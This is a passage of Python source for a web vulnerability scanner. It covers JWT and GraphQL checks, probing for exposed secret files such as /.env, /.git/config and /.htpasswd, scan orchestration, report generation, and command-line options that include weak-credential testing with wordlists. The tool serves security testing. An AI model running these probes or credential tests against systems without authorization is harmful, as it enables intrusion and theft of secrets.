                            evidence=f"Allow: {allow_header}",
                            remediation="Disable TRACE method on the web server",
                            cwe_id="CWE-693"
                        )

    def test_jwt_security(self):
        """Test for JWT security issues."""
        logger.info("🎫 Testing JWT Security...")
        
        response = self._send_request(self.base_url)
        if not response:
            return
        
        # Look for JWT tokens in response and cookies
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        
        # Check response body
        tokens = re.findall(jwt_pattern, response.text)
        
        # Check cookies
        for cookie in self.session.cookies:
            cookie_tokens = re.findall(jwt_pattern, cookie.value)
            tokens.extend(cookie_tokens)
        
        # Check Authorization header in response (if any)
        auth_header = response.headers.get('Authorization', '')
        if 'Bearer' in auth_header:
            auth_tokens = re.findall(jwt_pattern, auth_header)
            tokens.extend(auth_tokens)
        
        for token in set(tokens):
            self._analyze_jwt(token)
    
    def _analyze_jwt(self, token: str):
        """Analyze a JWT token for security issues."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            
            # Decode header
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Decode payload
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            # Check algorithm
            alg = header.get('alg', '')
            if alg.lower() == 'none':
                self._add_finding(
                    "JWT Algorithm None",
                    Severity.CRITICAL,
                    self.base_url,
                    "JWT uses 'none' algorithm - can be forged",
                    evidence=f"Header: {header}",
                    remediation="Use strong signing algorithms (RS256, ES256)",
                    cwe_id="CWE-327",
                    cvss_score=9.8
                )
            elif alg.lower() in ['hs256', 'hs384', 'hs512']:
                self._add_finding(
                    "JWT Weak Algorithm",
                    Severity.MEDIUM,
                    self.base_url,
                    f"JWT uses symmetric algorithm ({alg}) - may be vulnerable to key brute-forcing",
                    evidence=f"Algorithm: {alg}",
                    remediation="Consider using asymmetric algorithms (RS256, ES256)",
                    cwe_id="CWE-327"
                )
            
            # Check for sensitive data in payload
            sensitive_keys = ['password', 'secret', 'key', 'api_key', 'credit_card']
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    self._add_finding(
                        "JWT Contains Sensitive Data",
                        Severity.MEDIUM,
                        self.base_url,
                        f"JWT payload contains potentially sensitive field: {key}",
                        remediation="Don't store sensitive data in JWT payloads",
                        cwe_id="CWE-312"
                    )
            
            # Check expiration
            exp = payload.get('exp')
            if not exp:
                self._add_finding(
                    "JWT Missing Expiration",
                    Severity.LOW,
                    self.base_url,
                    "JWT token has no expiration claim",
                    remediation="Always set 'exp' claim with reasonable expiration",
                    cwe_id="CWE-613"
                )
            else:
                # Check if token is expired or has very long validity
                try:
                    exp_time = datetime.fromtimestamp(exp)
                    validity = exp_time - datetime.now()
                    
                    if validity.days > 30:
                        self._add_finding(
                            "JWT Long Validity",
                            Severity.LOW,
                            self.base_url,
                            f"JWT has very long validity period: {validity.days} days",
                            remediation="Use shorter token validity with refresh tokens",
                            cwe_id="CWE-613"
                        )
                except (ValueError, OSError):
                    pass
                    
        except Exception as e:
            logger.debug(f"JWT analysis error: {e}")
        
        logger.info("JWT Security testing complete.")

    def test_graphql_security(self):
        """Test for GraphQL-specific security issues."""
        logger.info("📊 Testing GraphQL Security...")
        
        graphql_paths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
        
        for path in graphql_paths:
            test_url = urljoin(self.base_url, path)
            
            # Test for introspection
            introspection_query = {
                "query": "{ __schema { types { name fields { name } } } }"
            }
            
            response = self._send_request(
                test_url, 
                method="POST", 
                json_data=introspection_query,
                headers={"Content-Type": "application/json"}
            )
            
            if response and response.status_code == 200:
                if '__schema' in response.text or '__type' in response.text:
                    self._add_finding(
                        "GraphQL Introspection Enabled",
                        Severity.LOW,
                        test_url,
                        "GraphQL introspection is enabled - exposes schema",
                        evidence=response.text[:300],
                        remediation="Disable introspection in production",
                        cwe_id="CWE-200"
                    )
                
                # Test for query batching
                batch_query = [
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"}
                ]
                
                batch_response = self._send_request(
                    test_url,
                    method="POST",
                    json_data=batch_query,
                    headers={"Content-Type": "application/json"}
                )
                
                if batch_response and batch_response.status_code == 200:
                    if '[' in batch_response.text[:10]:  # Array response indicates batching works
                        self._add_finding(
                            "GraphQL Query Batching Enabled",
                            Severity.LOW,
                            test_url,
                            "GraphQL query batching is enabled - potential DoS vector",
                            remediation="Limit batch query size or disable batching",
                            cwe_id="CWE-400"
                        )
        
        logger.info("GraphQL Security testing complete.")

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities."""
        logger.info("🔍 Testing for Information Disclosure...")
        
        # Common sensitive files/paths
        sensitive_paths = [
            '/.git/HEAD', '/.git/config', '/.svn/entries',
            '/.env', '/config.php', '/wp-config.php', '/config.yml',
            '/phpinfo.php', '/info.php', '/test.php',
            '/backup.zip', '/backup.sql', '/database.sql',
            '/server-status', '/server-info',
            '/.htaccess', '/.htpasswd',
            '/crossdomain.xml', '/clientaccesspolicy.xml',
            '/web.config', '/elmah.axd',
            '/.DS_Store', '/Thumbs.db',
            '/package.json', '/composer.json',
            '/readme.txt', '/README.md', '/CHANGELOG.md',
            '/admin/', '/administrator/', '/phpmyadmin/',
            '/.well-known/security.txt'
        ]
        
        for path in sensitive_paths:
            test_url = urljoin(self.base_url, path)
            response = self._send_request(test_url)
            
            if response and response.status_code == 200:
                # Check for actual sensitive content
                sensitive_indicators = [
                    ('/.git/', 'ref:', Severity.HIGH, "Git repository exposed"),
                    ('/.svn/', 'svn', Severity.HIGH, "SVN repository exposed"),
                    ('/.env', '=', Severity.CRITICAL, "Environment file exposed"),
                    ('/phpinfo', 'PHP Version', Severity.MEDIUM, "PHP info page exposed"),
                    ('/config', 'password', Severity.CRITICAL, "Config file exposed"),
                    ('/backup', 'CREATE TABLE', Severity.CRITICAL, "Database backup exposed"),
                    ('/server-status', 'Apache', Severity.MEDIUM, "Server status exposed"),
                ]
                
                for check_path, indicator, severity, desc in sensitive_indicators:
                    if check_path in path.lower() and indicator.lower() in response.text.lower():
                        self._add_finding(
                            f"Information Disclosure - {desc}",
                            severity,
                            test_url,
                            desc,
                            evidence=response.text[:300],
                            remediation="Remove or restrict access to sensitive files",
                            cwe_id="CWE-200"
                        )
                        break
        
        # Check for debug mode indicators in main page
        response = self._send_request(self.base_url)
        if response:
            debug_indicators = [
                "DEBUG = True", "debug mode", "stack trace",
                "Traceback (most recent call last)", "Notice:",
                "Warning:", "Fatal error:", "Parse error:"
            ]
            
            for indicator in debug_indicators:
                if indicator.lower() in response.text.lower():
                    self._add_finding(
                        "Debug Mode Enabled",
                        Severity.MEDIUM,
                        self.base_url,
                        f"Application appears to be in debug mode: {indicator}",
                        remediation="Disable debug mode in production",
                        cwe_id="CWE-215"
                    )
                    break
        
        logger.info("Information Disclosure testing complete.")


    def run_scan(self):
        """Run the comprehensive vulnerability scan."""
        logger.info(f"🚀 Starting comprehensive scan on {self.base_url}")
        logger.info("=" * 60)
        
        try:
            # Phase 1: Reconnaissance
            logger.info("\n📡 PHASE 1: Reconnaissance")
            logger.info("-" * 40)
            
            self.fingerprint_technologies()
            
            if getattr(self.args, 'crawl', True):
                self.crawl_website(
                    max_depth=getattr(self.args, 'crawl_depth', 2),
                    max_pages=getattr(self.args, 'max_pages', 50)
                )
            else:
                self.discover_forms(self.base_url)
            
            if getattr(self.args, 'scan_ports', False):
                self.scan_ports()
            
            if getattr(self.args, 'enum_subdomains', False):
                self.enumerate_subdomains()
            
            # Phase 2: Vulnerability Testing
            logger.info("\n🔍 PHASE 2: Vulnerability Testing")
            logger.info("-" * 40)
            
            # Communication Security
            self.test_insecure_communication()
            self.test_http_headers()
            self.test_cookie_security()
            
            # Authentication & Authorization
            self.test_csrf()
            self.test_clickjacking()
            if getattr(self.args, 'test_creds', True):
                self.test_weak_credentials()
            
            # Injection Vulnerabilities
            self.test_sql_injection()
            self.test_xss()
            self.test_ssti()
            self.test_command_injection()
            self.test_xxe()
            self.test_ldap_injection()
            
            # Other Vulnerabilities
            self.test_directory_traversal()
            self.test_ssrf()
            self.test_open_redirect()
            self.test_insecure_file_upload()
            
            # API & Modern Web
            self.test_cors()
            self.test_api_security()
            self.test_jwt_security()
            self.test_graphql_security()
            
            # Information Disclosure
            self.test_information_disclosure()
            
        except KeyboardInterrupt:
            logger.warning("\n⚠️ Scan interrupted by user")
        except Exception as e:
            logger.error(f"Scan error: {e}")
        
        # Calculate scan duration
        duration = datetime.now() - self.start_time
        
        logger.info("\n" + "=" * 60)
        logger.info(f"✅ Scan completed in {duration}")
        logger.info(f"📊 Statistics:")
        logger.info(f"   - Requests sent: {self.stats['requests_sent']}")
        logger.info(f"   - URLs crawled: {self.stats['urls_crawled']}")
        logger.info(f"   - Forms discovered: {self.stats['forms_discovered']}")
        logger.info(f"   - Vulnerabilities found: {self.stats['vulnerabilities_found']}")

    def report_findings(self, output_file: Optional[str] = None, format: str = "console"):
        """Generate and output the scan report."""
        print("\n" + "=" * 60)
        print("📋 SCAN RESULTS")
        print("=" * 60)
        
        if not self.findings:
            print("\n✅ No vulnerabilities found!")
            return

        # Sort findings by severity
        severity_order = {
            Severity.CRITICAL: 0,
            Severity.HIGH: 1,
            Severity.MEDIUM: 2,
            Severity.LOW: 3,
            Severity.INFO: 4
        }
        sorted_findings = sorted(self.findings, key=lambda x: severity_order[x.severity])
        
        # Count by severity
        severity_counts = defaultdict(int)
        for finding in self.findings:
            severity_counts[finding.severity.value] += 1
        
        print(f"\n📊 Summary:")
        print(f"   CRITICAL: {severity_counts.get('CRITICAL', 0)}")
        print(f"   HIGH: {severity_counts.get('HIGH', 0)}")
        print(f"   MEDIUM: {severity_counts.get('MEDIUM', 0)}")
        print(f"   LOW: {severity_counts.get('LOW', 0)}")
        print(f"   INFO: {severity_counts.get('INFO', 0)}")
        print(f"   TOTAL: {len(self.findings)}")
        
        if output_file:
            if format == "json":
                self._save_json_report(output_file, sorted_findings)
            elif format == "html":
                self._save_html_report(output_file, sorted_findings, severity_counts)
            else:
                self._save_json_report(output_file, sorted_findings)
        else:
            # Console output
            self._print_console_report(sorted_findings)
        
        print("\n" + "=" * 60)

    def _print_console_report(self, findings: List[Finding]):
        """Print findings to console."""
        print("\n📝 Detailed Findings:\n")
        
        for i, finding in enumerate(findings, 1):
            severity_colors = {
                Severity.CRITICAL: '\033[35m',
                Severity.HIGH: '\033[31m',
                Severity.MEDIUM: '\033[33m',
                Severity.LOW: '\033[36m',
                Severity.INFO: '\033[32m'
            }
            color = severity_colors.get(finding.severity, '\033[0m')
            reset = '\033[0m'
            
            print(f"{i}. [{color}{finding.severity.value}{reset}] {finding.vulnerability_type}")
            print(f"   URL: {finding.url}")
            print(f"   Detail: {finding.detail}")
            if finding.payload:
                print(f"   Payload: {finding.payload}")
            if finding.cwe_id:
                print(f"   CWE: {finding.cwe_id}")
            if finding.remediation:
                print(f"   Remediation: {finding.remediation}")
            print()

    def _save_json_report(self, output_file: str, findings: List[Finding]):
        """Save findings to JSON file."""
        try:
            report = {
                "scan_info": {
                    "target": self.base_url,
                    "scan_time": self.start_time.isoformat(),
                    "duration": str(datetime.now() - self.start_time),
                    "scanner_version": VERSION
                },
                "statistics": self.stats,
                "technologies_detected": dict(self.technologies_detected),
                "findings": [f.to_dict() for f in findings]
            }
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2)
            
            print(f"\n💾 Report saved to: {output_file}")
        except Exception as e:
            logger.error(f"Failed to save JSON report: {e}")

    def _save_html_report(self, output_file: str, findings: List[Finding], severity_counts: Dict):
        """Save findings to HTML report."""
        try:
            html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Scan Report - {self.base_url}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px; margin-bottom: 30px; }}
        h1 {{ font-size: 2em; margin-bottom: 10px; }}
        .meta {{ opacity: 0.9; font-size: 0.9em; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }}
        .summary-card {{ background: #16213e; padding: 20px; border-radius: 10px; text-align: center; }}
        .summary-card.critical {{ border-left: 4px solid #ff006e; }}
        .summary-card.high {{ border-left: 4px solid #ff4444; }}
        .summary-card.medium {{ border-left: 4px solid #ffbb33; }}
        .summary-card.low {{ border-left: 4px solid #00C851; }}
        .summary-card.info {{ border-left: 4px solid #33b5e5; }}
        .summary-card .count {{ font-size: 2.5em; font-weight: bold; }}
        .finding {{ background: #16213e; margin-bottom: 15px; border-radius: 10px; overflow: hidden; }}
        .finding-header {{ padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }}
        .finding-header:hover {{ background: #1f2b4a; }}
        .severity {{ padding: 5px 15px; border-radius: 20px; font-size: 0.8em; font-weight: bold; }}
        .severity.critical {{ background: #ff006e; }}
        .severity.high {{ background: #ff4444; }}
        .severity.medium {{ background: #ffbb33; color: #000; }}
        .severity.low {{ background: #00C851; }}
        .severity.info {{ background: #33b5e5; }}
        .finding-body {{ padding: 0 20px 20px; display: none; }}
        .finding.open .finding-body {{ display: block; }}
        .finding-body p {{ margin: 10px 0; padding: 10px; background: #0f0f23; border-radius: 5px; }}
        .finding-body strong {{ color: #667eea; }}
        .tech-list {{ display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }}
        .tech-tag {{ background: #667eea; padding: 5px 15px; border-radius: 20px; font-size: 0.9em; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔒 Security Scan Report</h1>
            <p class="meta">Target: {self.base_url}</p>
            <p class="meta">Scan Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p class="meta">Duration: {datetime.now() - self.start_time}</p>
            <p class="meta">Scanner Version: {VERSION}</p>
        </header>
        
        <section class="summary">
            <div class="summary-card critical">
                <div class="count">{severity_counts.get('CRITICAL', 0)}</div>
                <div>Critical</div>
            </div>
            <div class="summary-card high">
                <div class="count">{severity_counts.get('HIGH', 0)}</div>
                <div>High</div>
            </div>
            <div class="summary-card medium">
                <div class="count">{severity_counts.get('MEDIUM', 0)}</div>
                <div>Medium</div>
            </div>
            <div class="summary-card low">
                <div class="count">{severity_counts.get('LOW', 0)}</div>
                <div>Low</div>
            </div>
            <div class="summary-card info">
                <div class="count">{severity_counts.get('INFO', 0)}</div>
                <div>Info</div>
            </div>
        </section>
        
        {"".join(f'''
        <div class="finding" onclick="this.classList.toggle('open')">
            <div class="finding-header">
                <span>{f.vulnerability_type}</span>
                <span class="severity {f.severity.value.lower()}">{f.severity.value}</span>
            </div>
            <div class="finding-body">
                <p><strong>URL:</strong> {f.url}</p>
                <p><strong>Detail:</strong> {f.detail}</p>
                {"<p><strong>Payload:</strong> " + str(f.payload) + "</p>" if f.payload else ""}
                {"<p><strong>CWE:</strong> " + str(f.cwe_id) + "</p>" if f.cwe_id else ""}
                {"<p><strong>Remediation:</strong> " + str(f.remediation) + "</p>" if f.remediation else ""}
            </div>
        </div>
        ''' for f in findings)}
    </div>
</body>
</html>"""
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"\n💾 HTML Report saved to: {output_file}")
        except Exception as e:
            logger.error(f"Failed to save HTML report: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced Web Vulnerability Scanner v" + VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Basic scan:
    python scanner.py https://example.com
    
  Full scan with all features:
    python scanner.py https://example.com --full-scan
    
  With custom payloads and HTML report:
    python scanner.py https://example.com --sqli-payloads sqli.txt -o report.html --format html
    
  Scan with port scanning and subdomain enumeration:
    python scanner.py https://example.com --scan-ports --enum-subdomains
    
  Ignore SSL errors:
    python scanner.py https://self-signed.local --no-verify-ssl
        """
    )
    
    # Target
    parser.add_argument("url", help="Target website URL (e.g., https://example.com)")
    
    # Scan options
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument("--full-scan", action="store_true", help="Enable all scan features")
    scan_group.add_argument("--crawl", action="store_true", default=True, help="Enable web crawling (default: enabled)")
    scan_group.add_argument("--no-crawl", action="store_false", dest="crawl", help="Disable web crawling")
    scan_group.add_argument("--crawl-depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    scan_group.add_argument("--max-pages", type=int, default=50, help="Maximum pages to crawl (default: 50)")
    scan_group.add_argument("--scan-ports", action="store_true", help="Enable port scanning")
    scan_group.add_argument("--enum-subdomains", action="store_true", help="Enable subdomain enumeration")
    scan_group.add_argument("--test-creds", action="store_true", default=True, help="Test for weak credentials (default: enabled)")
    scan_group.add_argument("--no-test-creds", action="store_false", dest="test_creds", help="Disable credential testing")
    
    # Payload files
    payload_group = parser.add_argument_group('Payload Files')
    payload_group.add_argument("--sqli-payloads", help="File containing SQL injection payloads")
    payload_group.add_argument("--xss-payloads", help="File containing XSS payloads")
    payload_group.add_argument("--dir-payloads", help="File containing directory traversal payloads")
    payload_group.add_argument("--username-list", help="File containing usernames for credential testing")
    payload_group.add_argument("--password-list", help="File containing passwords for credential testing")
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument("-o", "--output", help="Output file for report")
    output_group.add_argument("--format", choices=["json", "html"], default="json", help="Report format (default: json)")
    output_group.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    output_group.add_argument("-q", "--quiet", action="store_true", help="Minimal output")
    
    # Connection options
    conn_group = parser.add_argument_group('Connection Options')
    conn_group.add_argument("--no-verify-ssl", action="store_false", dest="verify_ssl", help="Disable SSL certificate verification")
    conn_group.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    conn_group.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    
    args = parser.parse_args()
    
    # Enable all features for full scan
    if args.full_scan:
        args.scan_ports = True
        args.enum_subdomains = True
        args.crawl = True
        args.crawl_depth = 3
        args.max_pages = 100
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    elif args.quiet:
        logging.getLogger().setLevel(logging.WARNING)
    
    # Create scanner and run
    scanner = WebVulnerabilityScanner(args.url, args)
    
    try:
        scanner.run_scan()
    except KeyboardInterrupt:
        logger.warning("\n⚠️ Scan interrupted by user.")
    except Exception as e:
        logger.critical(f"Critical error during scan: {e}", exc_info=True)
    finally:
        scanner.report_findings(args.output, args.format)
